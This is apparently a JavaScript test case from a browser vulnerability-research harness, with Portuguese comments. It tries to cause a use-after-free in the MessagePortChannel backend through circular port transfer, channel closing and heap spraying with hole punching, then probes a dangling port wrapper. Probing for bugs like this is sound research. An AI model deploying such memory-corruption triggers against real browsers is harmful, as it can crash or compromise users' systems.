import { Groomer } from '../mod_groomer.js';

export default {
    id:       'MESSAGEPORT_TRANSFER_UAF',
    category: 'IPC',
    risk:     'HIGH',
    description:
        'Paradoxo de Ownership Circular em IPC. Tenta enviar um MessagePort através de si mesmo ' +
        'ou do seu par, e imediatamente fecha os canais e arranca a memória (Garbage Collection). ' +
        'Foca em causar Use-After-Free no backend C++ do MessagePortChannel.',

    setup: function() {
        this.results = {};
        this.mc1 = new MessageChannel();
        this.mc2 = new MessageChannel();
        
        // Mantemos uma referência fantasma para testar pós-free
        this.ghostPort = this.mc1.port1;
        this.ghostPort.start();
    },

    trigger: function() {
        try {
            // O GATILHO CIRCULAR
            // mc2.port1 envia o mc1.port1. Mas no array de transferências [ ],
            // transferimos a ownership do próprio mc2.port1 também!
            this.mc2.port1.postMessage("paradoxo", [this.mc1.port1, this.mc2.port1]);
            
            // Destruição síncrona
            this.mc1.port2.close();
            this.mc2.port2.close();
            
            // Inundação de memória
            let trash = Groomer.sprayStrings(256, 1000);
            Groomer.punchHoles(trash, 2);
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O C++ percebeu a falha e atirou DataCloneError?
        s => s.results.error || 'Transferência Circular Aceite',
        
        // Probe 1: O Wrapper do ghostPort ainda interage com o C++ morto?
        s => {
            try {
                // Se o C++ já libertou a memória nativa mas o wrapper continua vivo,
                // chamar .close() ou postMessage pode crashar a aba ou retornar lixo.
                s.ghostPort.close();
                return 'Wrapper Vivo / Seguro';
            } catch(e) {
                return `Anomalia Nativa: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        this.ghostPort = null;
        this.mc1 = null;
        this.mc2 = null;
        this.results = {};
    }
};
